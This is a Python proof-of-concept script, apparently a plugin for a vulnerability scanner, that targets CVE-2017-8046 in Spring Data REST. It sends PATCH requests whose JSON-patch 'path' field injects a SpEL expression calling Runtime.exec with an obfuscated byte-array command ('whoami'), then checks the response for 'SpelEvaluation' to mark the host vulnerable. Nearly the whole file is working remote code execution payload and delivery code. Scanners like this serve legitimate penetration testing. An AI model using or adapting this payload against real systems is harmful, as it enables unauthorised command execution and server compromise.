#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2017-8046'
        self.keyword = ['spring']
        self.info = 'spring rce (CVE-2017-8046)'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, './'):
                    headers = {
                        "Content-Type": "application/json-patch+json",
                    }
                    datas = [
                        '[{"op":"add","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119, 104, 111, 97, 109, 105}))/foo"}]',
                        '[{"op":"add","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119, 104, 111, 97, 109, 105}))[foo]"}]']
                    for _data in datas:
                        async with session.patch(url=path, data=_data, headers=headers) as res:
                            if res:
                                text = await res.text()
                                if "SpelEvaluation" in text:
                                    self.flag = 1
                                    self.res.append({"info": path, "key": "Spring RCE CVE-2017-8046"})
                                    break
